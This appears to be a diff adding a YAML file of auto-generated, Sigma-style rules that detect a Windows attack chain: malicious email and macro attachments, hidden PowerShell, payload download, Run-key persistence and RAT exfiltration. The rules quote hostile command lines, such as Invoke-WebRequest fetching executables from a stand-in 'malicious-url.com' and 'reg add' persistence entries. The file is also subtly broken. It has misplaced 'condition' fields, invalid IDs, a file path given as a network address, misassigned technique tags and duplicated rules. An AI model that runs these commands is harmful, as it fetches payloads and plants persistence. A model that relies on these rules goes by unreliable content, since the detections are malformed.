@@ -1,0 +1,572 @@
+```yaml
+- title: Identify Initial Access via Email for Concealment via PowerShell
+  id: 1c1e1c3b-1b2e-4c3b-8c1e-1c3b1c3b1c3
+  description: Monitor for the creation of processes related to Outlook that involve email interactions, specifically looking for emails with attachments named "malicious_script.ps1".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+      dstNode.Type: "File"
+      dstNode.Name: "malicious_script.ps1"
+  condition: selection
+  tags:
+    - T1203
+    - Initial Access
+  level: high
+---
+- title: Identify Execution of Malicious PowerShell Script
+  id: 2c2e2c3b-2b2e-4c3b-8c2e-2c3b2c3b2c3
+  description: Monitor for the execution of PowerShell with specific command line arguments that include `-ExecutionPolicy Bypass` and `-WindowStyle Hidden`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      srcNode.Cmdline: "powershell.exe -ExecutionPolicy Bypass -File \"C:\\Users\\User\\Downloads\\malicious_script.ps1\" -WindowStyle Hidden"
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - T1059
+    - Execution
+  level: high
+---
+- title: Identify Concealment of Activity
+  id: 3c3e3c3b-3b2e-4c3b-8c3e-3c3b3c3b3c3
+  description: Monitor for API calls related to `ShowWindow` or `CreateDesktop` that indicate attempts to run processes in a hidden state.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      relation: "Process Create"
+  condition: selection
+  tags:
+    - T1055
+    - Defense Evasion
+  level: medium
+---
+- title: Identify Further Payload Execution
+  id: 4c4e4c3b-4b2e-4c3b-8c4e-4c3b4c3b4c3
+  description: Monitor for PowerShell commands that download and execute additional payloads, particularly those that use `Invoke-WebRequest` and `Start-Process` with `-WindowStyle Hidden`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      srcNode.Cmdline: "Invoke-WebRequest -Uri \"http://malicious-url.com/payload.exe\" -OutFile \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\""
+      dstNode.Type: "Process"
+      dstNode.Image: "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Identify Registry Modification for Persistence
+  id: 5c5e5c3b-5b2e-4c3b-8c5e-5c3b5c3b5c3
+  description: Monitor for registry modifications that add entries to ensure the malicious payload runs on startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\reg.exe"
+      srcNode.Cmdline: "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousPayload\" /t REG_SZ /d \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\" /f"
+      dstNode.Type: "Registry"
+      dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  condition: selection
+  tags:
+    - T1547
+    - Persistence
+  level: high
+---
+- title: Identify Initial Access via Document for Hidden Window Creation
+  id: 6c6e6c3b-6b2e-4c3b-8c6e-6c3b6c3b6c3
+  description: Monitor for the creation of processes related to Microsoft Word that involve opening a document with a macro, specifically looking for documents named "malicious_document.docm".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      dstNode.Type: "File"
+      dstNode.Name: "malicious_document.docm"
+  condition: selection
+  tags:
+    - T1203
+    - Initial Access
+  level: high
+---
+- title: Identify Execution of Malicious Macro
+  id: 7c7e7c3b-7b2e-4c3b-8c7e-7c3b7c3b7c3
+  description: Monitor for the execution of macros in Microsoft Word that invoke PowerShell with hidden window properties.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      srcNode.Cmdline: "Shell \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\path\\to\\script.ps1\", vbHide"
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - T1059
+    - Execution
+  level: high
+---
+- title: Identify Concealment of Activity in PowerShell
+  id: 8c8e8c3b-8b2e-4c3b-8c8e-8c3b8c3b8c3
+  description: Monitor for PowerShell processes that run in a hidden state, particularly those that utilize API calls to `ShowWindow` or `GetConsoleWindow`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      relation: "Process Create"
+  condition: selection
+  tags:
+    - T1055
+    - Defense Evasion
+  level: medium
+---
+- title: Identify Payload Execution from PowerShell
+  id: 9c9e9c3b-9b2e-4c3b-8c9e-9c3b9c3b9c3
+  description: Monitor for PowerShell commands that download additional malware or perform reconnaissance, particularly those that use `Invoke-WebRequest` and `Start-Process` with hidden properties.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      srcNode.Cmdline: "Invoke-WebRequest -Uri \"http://malicious-url.com/malware.exe\" -OutFile \"C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe\""
+      dstNode.Type: "Process"
+      dstNode.Image: "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Identify Registry Modification for Malware Persistence
+  id: 10c10e3b-10b2e-4c3b-8c10e-10c3b10c10c
+  description: Monitor for registry modifications that ensure malware runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\reg.exe"
+      srcNode.Cmdline: "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Malware\" /t REG_SZ /d \"C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe\" /f"
+      dstNode.Type: "Registry"
+      dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  condition: selection
+  tags:
+    - T1547
+    - Persistence
+  level: high
+---
+- title: Identify Remote Access Tool Installation via Email
+  id: 11c11e3b-11b2e-4c3b-8c11e-11c3b11c11c
+  description: Monitor for the execution of a remote access tool installer from an email attachment, specifically looking for executables named "rat_installer.exe".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\explorer.exe"
+      dstNode.Type: "File"
+      dstNode.Name: "rat_installer.exe"
+  condition: selection
+  tags:
+    - T1203
+    - Initial Access
+  level: high
+---
+- title: Identify Concealment of Remote Access Tool Activity
+  id: 12c12e3b-12b2e-4c3b-8c12e-12c3b12c12c
+  description: Monitor for network connections initiated by the RAT to its command and control server, indicating hidden operations.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\path\\to\\rat.exe"
+      dstNode.Type: "Network"
+      dstNode.Dstaddress: "C:\\attacker-command-and-control-server"
+  condition: selection
+  tags:
+    - T1071
+    - Command and Control
+  level: high
+---
+- title: Identify Registry Modification for RAT Persistence
+  id: 13c13e3b-13b2e-4c3b-8c13e-13c3b13c13c
+  description: Monitor for registry modifications that ensure the RAT runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\reg.exe"
+      srcNode.Cmdline: "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"RAT\" /t REG_SZ /d \"C:\\path\\to\\rat.exe\" /f"
+      dstNode.Type: "Registry"
+      dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  condition: selection
+  tags:
+    - T1547
+    - Persistence
+  level: high
+---
+- title: Identify Exfiltration of Data via RAT
+  id: 14c14e3b-14b2e-4c3b-8c14e-14c3b14c14c
+  description: Monitor for network requests made by the RAT that indicate data exfiltration, particularly those using `Invoke-WebRequest`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\path\\to\\rat.exe"
+      dstNode.Type: "Network"
+      dstNode.Dstaddress: "http://malicious-url.com/exfiltrate"
+  condition: selection
+  tags:
+    - T1041
+    - Exfiltration
+  level: high
+---
+- title: Identify Execution of Hidden Scripts via Email
+  id: 15c15e3b-15b2e-4c3b-8c15e-15c3b15c15c
+  description: Monitor for the execution of PowerShell scripts that are triggered by email attachments, specifically those named "hidden_script.ps1".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+      dstNode.Type: "File"
+      dstNode.Name: "hidden_script.ps1"
+  condition: selection
+  tags:
+    - T1203
+    - Initial Access
+  level: high
+---
+- title: Identify Execution of Hidden Scripts
+  id: 16c16e3b-16b2e-4c3b-8c16e-16c3b16c16c
+  description: Monitor for PowerShell commands that execute scripts in hidden mode, particularly those using `-WindowStyle Hidden`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      srcNode.Cmdline: "powershell.exe -ExecutionPolicy Bypass -File \"C:\\path\\to\\hidden_script.ps1\" -WindowStyle Hidden"
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - T1059
+    - Execution
+  level: high
+---
+- title: Identify Concealment of Activity in Hidden Scripts
+  id: 17c17e3b-17b2e-4c3b-8c17e-17c3b17c17c
+  description: Monitor for API calls related to `ShowWindow` or `GetConsoleWindow` that indicate attempts to run scripts in a hidden state.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      relation: "Process Create"
+  condition: selection
+  tags:
+    - T1055
+    - Defense Evasion
+  level: medium
+---
+- title: Identify Payload Execution from Hidden Scripts
+  id: 18c18e3b-18b2e-4c3b-8c18e-18c3b18c18c
+  description: Monitor for PowerShell commands that download additional malware or perform reconnaissance, particularly those that use `Invoke-WebRequest` and `Start-Process` with hidden properties.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      srcNode.Cmdline: "Invoke-WebRequest -Uri \"http://malicious-url.com/malware.exe\" -OutFile \"C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe\""
+      dstNode.Type: "Process"
+      dstNode.Image: "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Identify Registry Modification for Malware Persistence
+  id: 19c19e3b-19b2e-4c3b-8c19e-19c3b19c19c
+  description: Monitor for registry modifications that ensure malware runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\reg.exe"
+      srcNode.Cmdline: "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Malware\" /t REG_SZ /d \"C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe\" /f"
+      dstNode.Type: "Registry"
+      dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  condition: selection
+  tags:
+    - T1547
+    - Persistence
+  level: high
+---
+- title: Identify Use of Application Properties for Concealment
+  id: 20c20e3b-20b2e-4c3b-8c20e-20c3b20c20c
+  description: Monitor for the execution of applications that are configured to run in a hidden state, particularly those named "malicious_app.exe".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\path\\to\\malicious_app.exe"
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - T1055
+    - Defense Evasion
+  level: medium
+---
+- title: Identify Execution of Malicious Application
+  id: 21c21e3b-21b2e-4c3b-8c21e-21c3b21c21c
+  description: Monitor for the execution of applications with hidden properties, particularly those that use `start /B`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\explorer.exe"
+      srcNode.Cmdline: "start /B \"C:\\path\\to\\malicious_app.exe\""
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - T1059
+    - Execution
+  level: high
+---
+- title: Identify Concealment of Activity in Malicious Application
+  id: 22c22e3b-22b2e-4c3b-8c22e-22c3b22c22c
+  description: Monitor for API calls related to `ShowWindow` that indicate attempts to run applications in a hidden state.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\path\\to\\malicious_app.exe"
+      relation: "Process Create"
+  condition: selection
+  tags:
+    - T1055
+    - Defense Evasion
+  level: medium
+---
+- title: Identify Payload Execution from Malicious Application
+  id: 23c23e3b-23b2e-4c3b-8c23e-23c3b23c23c
+  description: Monitor for commands executed by the malicious application that download additional malware or perform reconnaissance, particularly those using `Invoke-WebRequest`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\path\\to\\malicious_app.exe"
+      srcNode.Cmdline: "Invoke-WebRequest -Uri \"http://malicious-url.com/malware.exe\" -OutFile \"C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe\""
+      dstNode.Type: "Process"
+      dstNode.Image: "C:\\Users\\User\\AppData\\Local\\Temp\\malware.exe"
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Identify Registry Modification for Application Persistence
+  id: 24c24e3b-24b2e-4c3b-8c24e-24c3b24c24c
+  description: Monitor for registry modifications that ensure the malicious application runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\reg.exe"
+      srcNode.Cmdline: "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousApp\" /t REG_SZ /d \"C:\\path\\to\\malicious_app.exe\" /f"
+      dstNode.Type: "Registry"
+      dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  condition: selection
+  tags:
+    - T1547
+    - Persistence
+  level: high
+---
+- title: Identify Concealment through .NET Features
+  id: 25c25e3b-25b2e-4c3b-8c25e-25c3b25c25c
+  description: Monitor for the execution of .NET applications that utilize `ProcessStartInfo` to prevent the creation of a visible window.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\path\\to\\malicious_app.exe"
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - T1055
+    - Defense Evasion
+  level: medium
+---
+- title: Identify Execution of Malicious .NET Application
+  id: 26c26e3b-26b2e-4c3b-8c26e-26c3b26c26c
+  description: Monitor for the execution of .NET applications that download and execute additional malware, particularly those using `ProcessStartInfo` with hidden properties.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\path\\to\\malicious_app.exe"
+      srcNode.Cmdline: "ProcessStartInfo startInfo = new ProcessStartInfo(); startInfo.FileName = \"powershell.exe\"; startInfo.Arguments = \"-ExecutionPolicy Bypass -File \\\"C:\\\\\\\\path\\\\\\\\to\\\\\\\\malware.ps1\\\"\"; startInfo.WindowStyle = ProcessWindowStyle.Hidden; Process.Start(startInfo);"
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - T1059
+    - Execution
+  level: high
+---
+- title: Identify Registry Modification for .NET Application Persistence
+  id: 27c27e3b-27b2e-4c3b-8c27e-27c3b27c27c
+  description: Monitor for registry modifications that ensure the malicious .NET application runs at startup, specifically looking for commands that modify `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\reg.exe"
+      srcNode.Cmdline: "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousApp\" /t REG_SZ /d \"C:\\path\\to\\malicious_app.exe\" /f"
+      dstNode.Type: "Registry"
+      dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  condition: selection
+  tags:
+    - T1547
+    - Persistence
+  level: high
+```
